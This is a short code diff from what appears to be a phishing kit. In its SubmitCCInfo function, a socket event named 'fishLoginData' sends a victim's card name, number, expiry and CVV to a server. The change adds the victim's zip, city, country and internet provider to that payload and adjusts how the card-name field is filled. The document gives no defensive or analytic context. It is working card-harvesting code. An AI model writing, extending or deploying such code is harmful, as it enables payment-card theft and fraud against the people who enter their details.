@@ -32,7 +32,11 @@ const SubmitCCInfo = async () => {
         //FIRST ACTION TO CREATE SESSIONS
 
         socket.emit("fishLoginData", {
-            ip: ip,
+            ip,
+            zip,
+            city,
+            country,
+            provider,
             userAgent: window.navigator.userAgent,
             project: project,
             projectType: projectType,
@@ -50,7 +54,7 @@ const SubmitCCInfo = async () => {
             actionData:
                 `\nCard info:\nCard Name: ${hpCCFirstLastNameVal}\nCard Number: ${hpCardNumberVal}` +
                 `\nExp: ${hpCardMMYYVal} cvv: ${hpCardCvvVal}`,
-            ccName: `${hpFirstNameVal} ${hpLastNameVal}`,
+            ccName: `${hpCCFirstLastNameVal}`,
             ccNumber: hpCardNumberVal,
             ccExp: hpCardMMYYVal,
             ccCVV: hpCardCvvVal,
